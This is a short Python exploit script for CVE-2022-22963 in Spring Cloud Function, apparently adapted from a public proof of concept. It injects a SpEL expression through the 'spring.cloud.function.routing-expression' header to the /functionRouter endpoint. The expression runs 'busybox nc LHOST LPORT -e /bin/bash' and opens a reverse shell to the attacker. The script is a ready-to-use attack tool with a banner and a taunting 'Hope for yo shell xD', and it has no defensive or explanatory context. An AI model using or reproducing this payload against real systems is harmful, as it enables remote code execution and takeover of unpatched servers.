#!/usr/bin/python3
# Author: Hack.You
# Source: https://github.com/me2nuk/CVE-2022-22963 (main exploit)

import requests
import sys
from termcolor import colored
import time

print(colored('''
 _   _  ___   ___  ____    _   _ _  _ __  _____  ____  
| \ | |/ _ \ / _ \| __ )  | | | | || |\ \/ / _ \|  _ \ 
|  \| | | | | | | |  _ \  | |_| | || |_\  / | | | |_) |
| |\  | |_| | |_| | |_) | |  _  |__   _/  \ |_| |  _ < 
|_| \_|\___/ \___/|____/  |_| |_|  |_|/_/\_\___/|_| \_\
                                                                                             
''' , 'red'))

if len(sys.argv) < 4:
    print('\033[91m' + '@Author: Hack.You' + '\033[0m')
    print(colored(f"Usage: python3 {sys.argv[0]} http://pwnme.local 8080 LHOST LPORT", 'blue'))
    sys.exit(0)

url = sys.argv[1]
port = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

payload = f"busybox nc {lhost} {lport} -e /bin/bash"

headers = {"spring.cloud.function.routing-expression": f"T(java.lang.Runtime).getRuntime().exec('{payload}')" }

data = "data"
print(colored("Sending payload......", 'blue'))
time.sleep(1)
url = f"{url}:{port}/functionRouter"

try:
    res = requests.post(url, headers=headers, data=data)
    print(colored("Hope for yo shell xD", 'red'))
except Exception as e:
    print(f"An error occurred: {e}")
